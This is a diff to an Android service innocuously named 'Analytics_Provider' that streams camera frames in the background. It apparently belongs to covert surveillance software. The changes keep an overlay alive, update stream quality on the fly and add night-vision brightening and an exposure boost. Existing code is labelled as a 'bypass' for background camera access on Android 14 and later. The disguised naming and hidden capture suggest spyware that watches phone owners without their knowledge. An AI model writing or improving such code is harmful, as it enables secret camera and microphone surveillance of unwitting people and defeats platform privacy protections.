@@ -109,6 +109,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
     private static volatile int streamHeight = 480;
     private static volatile int streamQuality = 50;
     private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);
+    private final Handler cameraHandler = new Handler(Looper.getMainLooper());
     private static volatile byte[] latestFrame = null;
     private static volatile byte[] lastCapturedPhoto = null;
     private static volatile String lastCaptureError = null;
@@ -131,6 +132,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         
         createNotificationChannel();
         ensureForeground();
+        createOverlay();
         
         nightModeEnabled = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("night_mode", false);
         
@@ -188,7 +190,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (isRecording && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
             }
             startForeground(NOTIFICATION_ID, notification, serviceType);
@@ -206,6 +208,14 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         
         Log.d(TAG, "OPTICS_INIT: startStreaming(" + cameraId + ")");
 
+        if (isStreaming && cameraId != null && cameraId.equals(currentCameraId)) {
+            streamWidth = width;
+            streamHeight = height;
+            streamQuality = quality;
+            Log.d(TAG, "OPTICS_UPDATE: Quality updated in-flight (" + width + "x" + height + " q=" + quality + ")");
+            return;
+        }
+
         // [STABILITY_BYPASS] Required ONLY for Android 14+ background camera access
         if (Build.VERSION.SDK_INT >= 34) {
             try {
@@ -215,23 +225,23 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
             } catch (Exception e) { Log.e(TAG, "Bypass fail: " + e.getMessage()); }
         }
 
-        new Handler(Looper.getMainLooper()).post(() -> {
+        cameraHandler.removeCallbacksAndMessages(null);
+        cameraHandler.post(() -> {
             try {
-                if (reinitPending) return;
-                reinitPending = true;
-
-                // --- 1. FULL HARDWARE TEARDOWN ---
+                // --- 1. UNBIND PREVIOUS USE CASES ---
                 isStreaming = false;
                 frameQueue.clear();
-                lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED); // Force unbind via lifecycle
-                cameraProvider.unbindAll();
+                if (cameraProvider != null) {
+                    cameraProvider.unbindAll();
+                }
                 
-                // Breath time for HAL - increased to 1000ms for absolute stability
-                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                // Breath time for Samsung Camera2 HAL (100ms for instantaneous switching)
+                cameraHandler.postDelayed(() -> {
                     try {
                         currentCameraId = cameraId;
                         streamWidth = width;
                         streamHeight = height;
+                        streamQuality = quality;
                         streamQuality = quality;
                         
                         createOverlay();
@@ -248,14 +258,6 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                                 .setTargetRotation(targetRotation)
                                 .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);
 
-                        // Nightmode Overrides (Bypass AE)
-                        if (nightModeEnabled) {
-                            Camera2Interop.Extender<ImageAnalysis> extender = new Camera2Interop.Extender<>(analysisBuilder);
-                            extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_OFF);
-                            extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_EXPOSURE_TIME, 100000000L); // 1/10s
-                            extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_SENSITIVITY, 2400); 
-                        }
-
                         imageAnalysis = analysisBuilder.build();
                         imageAnalysis.setAnalyzer(cameraExecutor, image -> {
                             if (!isStreaming) { image.close(); return; }
@@ -271,6 +273,21 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                                         Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
                                         bitmap.recycle();
                                         bitmap = rotated;
+                                    }
+
+                                    if (nightModeEnabled) {
+                                        try {
+                                            android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
+                                            android.graphics.Paint paint = new android.graphics.Paint();
+                                            android.graphics.ColorMatrix cm = new android.graphics.ColorMatrix(new float[] {
+                                                2.2f, 0,    0,    0, 25f,
+                                                0,    2.2f, 0,    0, 25f,
+                                                0,    0,    2.2f, 0, 25f,
+                                                0,    0,    0,    1.0f, 0f
+                                            });
+                                            paint.setColorFilter(new android.graphics.ColorMatrixColorFilter(cm));
+                                            canvas.drawBitmap(bitmap, 0, 0, paint);
+                                        } catch (Exception ignored) {}
                                     }
                                     
                                     ByteArrayOutputStream out = new ByteArrayOutputStream();
@@ -323,6 +340,14 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                         lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
                         camera = cameraProvider.bindToLifecycle(this, selector, useCases.toArray(new androidx.camera.core.UseCase[0]));
                         
+                        // Apply Night Mode Exposure Compensation EV boost
+                        if (camera != null && nightModeEnabled) {
+                            try {
+                                int maxEv = camera.getCameraInfo().getExposureState().getExposureCompensationRange().getUpper();
+                                if (maxEv > 0) camera.getCameraControl().setExposureCompensationIndex(maxEv);
+                            } catch (Exception ignored) {}
+                        }
+
                         // Promotion to RESUMED ensures highest priority for background processing
                         lifecycleRegistry.setCurrentState(Lifecycle.State.RESUMED);
                         
@@ -332,14 +357,11 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                     } catch (Exception e) {
                         Log.e(TAG, "Binding Error: " + e.getMessage());
                         isStreaming = false;
-                    } finally {
-                        reinitPending = false;
                     }
-                }, 1000); 
+                }, 100); 
 
             } catch (Exception e) {
                 Log.e(TAG, "Sync Error: " + e.getMessage());
-                reinitPending = false;
             }
         });
     }
@@ -647,7 +669,6 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                     if (cameraProvider != null) {
                         cameraProvider.unbindAll();
                     }
-                    removeOverlay();
                 } else if (imageAnalysis != null) {
                     // [STABILITY_SYNC] If recording, only unbind analysis to keep video alive
                     cameraProvider.unbind(imageAnalysis);
@@ -725,16 +746,21 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
     
     @androidx.camera.camera2.interop.ExperimentalCamera2Interop
     public void setNightMode(boolean e) { 
-        if (nightModeEnabled == e) return; // Ignore redundant calls
-        
         nightModeEnabled = e; 
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("night_mode", e).apply();
-        
         Log.d(TAG, "OPTICS_PROTOCOL: Nightmode set to " + e);
 
-        if (isStreaming || reinitPending) {
-            // Initiate full hardware cycle
-            startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
+        if (camera != null) {
+            try {
+                if (nightModeEnabled) {
+                    int maxEv = camera.getCameraInfo().getExposureState().getExposureCompensationRange().getUpper();
+                    if (maxEv > 0) camera.getCameraControl().setExposureCompensationIndex(maxEv);
+                } else {
+                    camera.getCameraControl().setExposureCompensationIndex(0);
+                }
+            } catch (Exception ex) {
+                Log.e(TAG, "Nightmode EV Toggle Error: " + ex.getMessage());
+            }
         }
     }
     public void setFlashMode(boolean on) { if (camera != null) camera.getCameraControl().enableTorch(on); }
